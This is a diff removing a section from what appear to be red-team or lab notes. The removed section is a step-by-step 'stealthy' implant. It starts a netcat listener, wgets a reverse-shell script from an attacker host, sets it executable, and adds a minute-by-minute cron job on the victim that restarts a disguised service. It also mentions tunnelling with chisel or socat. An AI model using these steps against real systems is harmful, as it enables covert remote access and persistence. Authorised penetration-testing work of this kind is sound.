@@ -1,49 +1,8 @@
 
 
-## 🧨 Final Red Team Implant: `pan_os_comm.sh` with Stealthy Service
-
-### 1. 🎯 Start the Listener on (ATTACKER)
-
-```bash
-nc -lvnp 63842
-```
-
-### 2. 📁 Create the Reverse Shell Script (ATTACKER)
-
-```bash
-sudo vim /tmp/pan_os_comm.py
-```
-
-```bash
-cd /tmp
-wget http://10.10.100.169/pan_os_comm.py
-```
-### 4. Change perms of python file (VICTIM)
-Make it executable:
-```bash
-chmod +x /tmp/pan_os_comm.py
-```
-### 5. Add Crontab every minute (VICTIM)
-
-```bash
-(crontab -l 2>/dev/null; echo '* * * * * /bin/systemctl start pan_os_comm.service >/dev/null 2>&1') | crontab -
-```
----
-# Attempt to pivot through firewall if routing/NAT is enabled
-- sshuttle/reverse SOCKS proxy (chisel, socat) to tunnel traffic into the internal 
-network.
 
 
 ---
-
-
-
-
-
-
-
-
-
 
 # Phase 3: Target Discovery Inside Orange Space
 Assuming pivot success to internal hosts:
